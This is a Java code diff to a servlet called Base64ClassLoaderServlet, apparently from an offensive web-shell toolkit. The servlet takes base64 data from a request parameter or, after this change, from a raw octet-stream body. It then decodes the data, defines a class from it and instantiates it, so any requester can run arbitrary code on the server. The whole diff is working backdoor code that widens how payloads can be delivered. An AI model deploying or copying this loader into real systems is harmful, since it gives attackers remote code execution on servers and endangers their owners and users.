@@ -1,6 +1,8 @@
 import jakarta.servlet.*;
 
+import java.io.ByteArrayOutputStream;
 import java.io.IOException;
+import java.io.InputStream;
 
 /**
  * @author ReaJason
@@ -20,7 +22,24 @@ public class Base64ClassLoaderServlet extends ClassLoader implements Servlet {
 
     @Override
     public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException {
-        String data = req.getParameter("data");
+        String contentType = req.getContentType();
+        String data;
+        if (contentType != null && contentType.startsWith("application/octet-stream")) {
+            ByteArrayOutputStream buffer = new ByteArrayOutputStream();
+            InputStream input = req.getInputStream();
+            try {
+                byte[] chunk = new byte[8192];
+                int length;
+                while ((length = input.read(chunk)) != -1) {
+                    buffer.write(chunk, 0, length);
+                }
+            } finally {
+                input.close();
+            }
+            data = new String(buffer.toByteArray(), "ISO-8859-1");
+        } else {
+            data = req.getParameter("data");
+        }
         try {
             byte[] bytes = decodeBase64(data);
             Object obj = defineClass(null, bytes, 0, bytes.length).newInstance();
